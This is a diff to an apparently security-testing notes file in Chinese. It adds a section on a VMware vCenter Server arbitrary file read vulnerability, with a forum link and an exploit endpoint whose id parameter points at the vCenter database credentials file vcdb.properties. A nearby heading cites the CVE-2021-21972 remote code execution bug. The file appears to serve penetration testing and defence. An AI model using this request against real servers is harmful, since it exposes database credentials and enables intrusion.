@@ -6,6 +6,15 @@
 /sdk/vimServiceVersions.xml
 ```
 
+### VMware vCenter Server 任意文件读取漏洞
+
+[VMware vCenter Server 任意文件读取漏洞](https://forum.90sec.com/t/topic/1582)
+
+endpoint
+```
+/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
+```
+
 ### CVE-2021-21972
 
 [VMware vCenter RCE 漏洞踩坑实录——一个简单的RCE漏洞到底能挖出什么知识](https://mp.weixin.qq.com/s/eamNsLY0uKHXtUw_fiUYxQ)
